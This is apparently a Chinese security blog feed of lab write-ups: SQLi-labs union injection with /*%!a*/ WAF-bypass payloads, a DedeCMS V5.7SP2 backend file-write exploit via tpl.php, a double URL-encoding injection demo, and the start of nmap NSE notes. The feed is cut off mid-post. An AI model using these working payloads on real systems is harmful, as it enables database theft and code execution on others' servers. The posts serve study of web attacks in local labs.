<p>只要是有空格都进行fuzz<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911100553.png"><br>也是有很多呗过滤了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911100930.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911101047.png"><br>也有语法错误的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911101150.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911101223.png"><br>查看没有被过成功执行的也有很多<br>URL是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1&#39;&#x2F;*%!a*&#x2F;ORDER&#x2F;*%!a*&#x2F;BY&#x2F;*%!a*&#x2F;1&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911101325.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911101414.png"><br>判断列数<br>输入4发现就报错了,那这样就判断出来，字段是有3个<br>输入第3个可以看到正常显示<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1&#39;&#x2F;*%!a*&#x2F;ORDER&#x2F;*%!a*&#x2F;BY&#x2F;*%!a*&#x2F;3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911102014.png"><br>输入第4个就报错了<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1&#39;&#x2F;*%!a*&#x2F;ORDER&#x2F;*%!a*&#x2F;BY&#x2F;*%!a*&#x2F;4&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911102204.png"><br>被绕过的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;&#x2F;*%!aa*&#x2F;ORDER&#x2F;*%!aa*&#x2F;BY&#x2F;*%!aa*&#x2F;1&#x2F;*%!aa*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!1a*&#x2F;ORDER&#x2F;*%!1a*&#x2F;BY&#x2F;*%!1a*&#x2F;1&#x2F;*%!1a*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!!a*&#x2F;ORDER&#x2F;*%!!a*&#x2F;BY&#x2F;*%!!a*&#x2F;1&#x2F;*%!!a*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%%!a*&#x2F;ORDER&#x2F;*%%!a*&#x2F;BY&#x2F;*%%!a*&#x2F;1&#x2F;*%%!a*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!%a*&#x2F;ORDER&#x2F;*%!%a*&#x2F;BY&#x2F;*%!%a*&#x2F;1&#x2F;*%!%a*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!(a*&#x2F;ORDER&#x2F;*%!(a*&#x2F;BY&#x2F;*%!(a*&#x2F;1&#x2F;*%!(a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<h3 id="观察页面返回，选择可以显示数据的位置，进行下一步的注入"><a href="#观察页面返回，选择可以显示数据的位置，进行下一步的注入" class="headerlink" title="观察页面返回，选择可以显示数据的位置，进行下一步的注入"></a>观察页面返回，选择可以显示数据的位置，进行下一步的注入</h3><p>通过上面的fuzz出来的<code>/*%!a*/</code>也可以在<code>union select 1,2,3</code>用还是可以绕过的<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,2,3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>结果是<code>2</code>和<code>3</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911110630.png"></p>
<h3 id="读取库的信息"><a href="#读取库的信息" class="headerlink" title="读取库的信息"></a>读取库的信息</h3><h4 id="读取用户名"><a href="#读取用户名" class="headerlink" title="读取用户名"></a>读取用户名</h4><p>还是用的<code>/*%!a*/</code>绕过waf<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,user(),3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>发现添加了<code>user()</code>被拦截了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911111356.png"></p>
<p>我们上面在<code>()</code>后面添加<code>/*%!a*/</code>变成了<code>user/*%!a*/()</code><br>发现可以完美绕过<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911111618.png"><br>其他的方法</p>
<h4 id="读取当前目录"><a href="#读取当前目录" class="headerlink" title="读取当前目录"></a>读取当前目录</h4><p>这个<code>@@datadir</code>函数waf没有被过滤<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,@@datadir,3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911112200.png"></p>
<h4 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h4><p>这个<code>@@version_compile_os</code>函数也waf也是没有过滤的<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,@@version_compile_os,3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911112549.png"></p>
<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><h4 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h4><p>还是用<code>/*%!a*/</code>来绕过waf<br>查询数据库的语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,(select&#x2F;*%!a*&#x2F;schema_name&#x2F;*%!a*&#x2F;from&#x2F;*%!a*&#x2F;information_schema.schemata&#x2F;*%!a*&#x2F;LIMIT 0,1),3&#x2F;*%!a*&#x2F;1--+</span><br></pre></td></tr></table></figure>
<p>可以看到查询出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911170525.png"><br><strong>用<code>group_concat()</code>函数读取全部的数据库名</strong><br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,(select&#x2F;*%!a*&#x2F;group_concat(schema_name)&#x2F;*%!a*&#x2F;from&#x2F;*%!a*&#x2F;information_schema.schemata&#x2F;*%!a*&#x2F;LIMIT 0,1),3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>结果可以看到已经显示出来的全部的数据库</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911171023.png"></p>
<h4 id="读取查表"><a href="#读取查表" class="headerlink" title="读取查表"></a>读取查表</h4><p>通过上面的查询库名知道了数据库名<br>语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;上面查询出来的数据库名&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还是全部的空格都替换成<code>/*%!a*/</code><br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,(select&#x2F;*%!a*&#x2F;group_concat(table_name)&#x2F;*%!a*&#x2F;from&#x2F;*%!a*&#x2F;information_schema.tables&#x2F;*%!a*&#x2F;where&#x2F;*%!a*&#x2F;table_schema&#x3D;&#39;security&#39;),3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>结果成功叫读取查表<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911171438.png"></p>
<h4 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h4><p>通过上面的查询查询出来了库和表<br>通过上面的表查询列<br>语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;表名&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还是全部的空格都替换成<code>/*%!a*/</code><br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;-1%27&#x2F;*%!a*&#x2F;union&#x2F;*%!a*&#x2F;select&#x2F;*%!a*&#x2F;1,(select&#x2F;*%!a*&#x2F;group_concat(column_name)&#x2F;*%!a*&#x2F;from&#x2F;*%!a*&#x2F;information_schema.columns&#x2F;*%!a*&#x2F;where&#x2F;*%!a*&#x2F;table_name&#x3D;&#39;users&#39;),3&#x2F;*%!a*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>结果查询出来了列<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911172244.png"></p>
<h4 id="读取数据-1"><a href="#读取数据-1" class="headerlink" title="读取数据"></a>读取数据</h4><p>通过上面的注入，知道了库，表，列<br>知道了全部就可以查询数据了<br>语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名 from 库名.表名</span><br></pre></td></tr></table></figure>
<p>结果已经读取到数据库数据<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911173008.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DedeCMS-V5.7SP2后台代码执行漏洞复现</title>
    <url>/2020/09/28/DedeCMS-V5.7SP2%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>安装什么很简单就设置一个数据库密码就不多说了<br>我用的服务器是phpstudy<br>下载地址<a href="xp.cn">xp.cn</a><br>DedeCMS-V5.7SP2官方下载地址<a href="http://dedecms.com/products/dedecms/downloads/">http://dedecms.com/products/dedecms/downloads/</a><br>我在官方下载的出来的保存在蓝奏云地址<a href="https://wwa.lanzous.com/i8zW7h12t9i">https://wwa.lanzous.com/i8zW7h12t9i</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台在<code>/dede/</code>文件里面<br>默认用户<code>admin</code>密码是<code>admin</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200929171547.png"><br>登录成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200929171620.png"></p>
<p>在访问这个地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问域名 + &#x2F;dede&#x2F;tpl.php?action&#x3D;upload</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200929171945.png"><br>查看一下<code>token</code>源代码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200929172033.png"></p>
<p>写入恶意脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问域名 + </span><br><span class="line">&#x2F;dede&#x2F;tpl.php?filename&#x3D;secquan.lib.php&amp;action&#x3D;savetagfile&amp;content&#x3D;&lt;?php%20phpinfo();?&gt;&amp;token&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200929172911.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>7. 网易web安全渗透， sql漏洞之二次编码注入</title>
    <url>/2020/08/10/7.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="二次编码注入原理"><a href="#二次编码注入原理" class="headerlink" title="二次编码注入原理"></a>二次编码注入原理</h2><p>为什么要进行编码，有点应为原始的格式并不适合传输<br>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+  &#x3D;  &amp;  ;</span><br></pre></td></tr></table></figure>
<p>要是上面的这个符号在http传输中会和原始的有冲突</p>
<p>原理<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820104019273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>urlencode()函数就是URL编码的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&quot;%25&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;urlencode($str);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果等于</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%</span><br></pre></td></tr></table></figure>

<p>上面的<code>%25</code>url解码后就是<code>%</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820104640818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p><code>%27</code>就是<code>&#39;</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200820105252656.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><p>应为没有实验环境我就自己写了一个<br>a.php文件<br>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">	$s = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	$u= <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	$p = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建连接</span></span><br><span class="line">	$conn = mysqli_connect($s, $u, $p);	 </span><br><span class="line">	<span class="comment">// 检测连接</span></span><br><span class="line">	<span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;连接失败： &quot;</span> . mysqli_connect_error());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	$id=urldecode($id);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	mysqli_select_db($conn,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">	$a=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;sql执行的语句： &#x27;</span>.$a.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	$b=mysqli_query($conn,$a);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;输出结果:&#x27;</span>;</span><br><span class="line">	$DuQu=mysqli_fetch_assoc($b);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($DuQu) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\&quot;&quot;</span>.$DuQu[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;&quot;</span>.$DuQu[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($conn);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输入<code>?id=1</code><br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020082011371211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="二次编码进行注入"><a href="#二次编码进行注入" class="headerlink" title="二次编码进行注入"></a>二次编码进行注入</h3><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><p>输入URL：<code>?id=1&#39;</code><br>结果被转意了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120754221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们在进行宽字节注入<br>还是不行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120849771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以用二次编码注入进行注入了<br>URL地址<code>http://192.168.0.105/a.php?id=1%2527</code><br>发现叫<code>\</code>给去掉了<br>是存在sql注入漏洞的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120948537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="进行数据读取"><a href="#进行数据读取" class="headerlink" title="进行数据读取"></a>进行数据读取</h3><ol>
<li>判断有几列<br>URL地址<code>http://192.168.0.105/a.php?id=1%2527 order by 3 --+</code><br>显示正常<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020082112130473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>URL地址<code>http://192.168.0.105/a.php?id=1%2527 order by 4 --+</code><br>报错<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821121424962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等等等等等等等等等等等等等就不演示了</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>6 ,nmap NSE中的API port table(表)，NSE库文件编写</title>
    <url>/2020/08/30/6%20,nmap%20NSE%E4%B8%AD%E7%9A%84API%20port%20table(%E8%A1%A8)%EF%BC%8CNSE%E5%BA%93%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="书名诸神之眼NMAP-学习笔记"><a href="#书名诸神之眼NMAP-学习笔记" class="headerlink" title="书名诸神之眼NMAP 学习笔记"></a>书名诸神之眼NMAP 学习笔记</h2><h2 id="port-table-表"><a href="#port-table-表" class="headerlink" title="port table(表)"></a>port table(表)</h2><ol>
<li>port.number字段<br>这个字段标识了目标端口<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return port.number</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611073135242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>2. port.protocol<br>这个字段是识别TCP和UDP的端口的类型<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return port.protocol</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611073532149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>3. port.service字段<br>字段是目标的端口的运行的服务<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return port.service</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21 </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611074024662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4. port.version字段<br>字段中保存了通过服务扫描发现的版本信息，包括name、name_confidence、product、version、extrainfo、hostname、ostype、devicetype、service_tunnel、service_ftp以及cpe_code等字段。注意这个字段需要使用参数-sV<br>咧<br>代码</p>
